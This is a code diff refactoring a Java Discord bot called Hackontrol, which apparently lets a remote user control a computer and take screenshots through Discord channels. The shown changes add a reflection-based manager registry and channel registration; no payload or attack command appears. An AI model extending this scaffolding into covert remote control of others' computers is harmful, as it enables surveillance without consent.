@@ -5,8 +5,10 @@ import java.util.List;
 
 import com.khopan.hackontrol.channel.ControlChannel;
 import com.khopan.hackontrol.channel.ScreenshotChannel;
-import com.khopan.hackontrol.manager.ButtonManager;
 import com.khopan.hackontrol.manager.Manager;
+import com.khopan.hackontrol.manager.ManagerRegistry;
+import com.khopan.hackontrol.registry.RegistrationHandler;
+import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.registry.RegistryType;
 import com.khopan.hackontrol.utils.DiscordUtils;
 
@@ -24,6 +26,8 @@ public class Hackontrol {
 
 	private static Hackontrol INSTANCE;
 
+	private final List<Manager> managerList;
+	private final RegistrationHandler registrationHandler;
 	private final JDA bot;
 	private final Guild guild;
 	private final Category category;
@@ -34,17 +38,16 @@ public class Hackontrol {
 
 	private Hackontrol() {
 		Hackontrol.INSTANCE = this;
-		JDABuilder builder = JDABuilder.createDefault(Token.BOT_TOKEN)
-				.enableIntents(GatewayIntent.MESSAGE_CONTENT);
-		//.addEventListeners(new Listener());
-
-		new ButtonManager().configureBuilder(builder);
+		this.managerList = new ArrayList<>();
+		ManagerRegistry.register(new HackontrolManagerRegistryImplementation());
+		this.registrationHandler = new RegistrationHandler();
+		JDABuilder builder = JDABuilder.createDefault(Token.BOT_TOKEN).enableIntents(GatewayIntent.MESSAGE_CONTENT);
+		this.managerList.forEach(manager -> manager.configureBuilder(builder));
 		this.bot = builder.build();
 
 		try {
 			this.bot.awaitReady();
 		} catch(Throwable Errors) {
-			System.exit(0);
 			throw new RuntimeException();
 		}
 
@@ -61,6 +64,8 @@ public class Hackontrol {
 			TextChannel channel = DiscordUtils.getOrCreateTextChannelInCategory(this.category, channelName);
 			hackontrolChannel.channel = channel;
 			//hackontrolChannel.registerButtonHandler(this :: registerButtonHandler);
+			Registry registry = this.registrationHandler.createRegistry(hackontrolChannel);
+			hackontrolChannel.register(registry);
 
 			if(DiscordUtils.isChannelEmpty(channel)) {
 				hackontrolChannel.initialize();
@@ -90,6 +95,34 @@ public class Hackontrol {
 		}
 
 		return Hackontrol.INSTANCE;
+	}
+
+	private class HackontrolManagerRegistryImplementation implements Registry {
+		@Override
+		public <T, U> void register(RegistryType<T, U> type, T identifier, U value) {
+			this.register(type, value);
+		}
+
+		@SuppressWarnings("unchecked")
+		@Override
+		public <U> void register(RegistryType<?, U> type, U value) {
+			if(!Hackontrol.MANAGER_REGISTRY.equals(type)) {
+				throw new IllegalArgumentException("Invalid registry type");
+			}
+
+			if(value == null) {
+				return;
+			}
+
+			Class<? extends Manager> managerClass = (Class<? extends Manager>) value;
+
+			try {
+				Manager manager = managerClass.getDeclaredConstructor().newInstance();
+				Hackontrol.this.managerList.add(manager);
+			} catch(Throwable Errors) {
+				throw new RuntimeException(Errors);
+			}
+		}
 	}
 
 	/*private class Listener extends ListenerAdapter {
